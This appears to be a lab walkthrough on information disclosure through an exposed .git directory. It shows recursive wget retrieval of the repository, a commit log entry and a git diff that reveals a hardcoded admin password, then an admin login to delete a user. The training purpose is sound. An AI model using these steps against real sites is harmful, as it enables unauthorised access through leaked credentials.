# Lab: Information disclosure in version control history

Browse to `/.git` to see that the version control data is available. Run `wget -r <lab-url>/.git` to retrieve the whole repo.

Inspect the contents and see that `.git/logs/HEAD` contains a commit comment: 

<pre>f835e84a90b5b21f14a24a00e66bc261ade1fc07 9745843b871e560ec74eb875abdd19be2612593f Carlos Montoya <carlos@evil-user.net> 1643903580 +0000	commit: Remove admin password from config</pre>

With this informatin, the password can be found by looking at the diff of the commit hashes associated with the change:

`git diff 9745843b871e560ec74eb875abdd19be2612593f f835e84a90b5b21f14a24a00e66bc261ade1fc07`

This shows the following changes:

<pre>
@@ -1 +1 @@
-ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+ADMIN_PASSWORD=8kqt7ks94qsg50q4vtu4
</pre>

Login and delete carlos to finish the lab.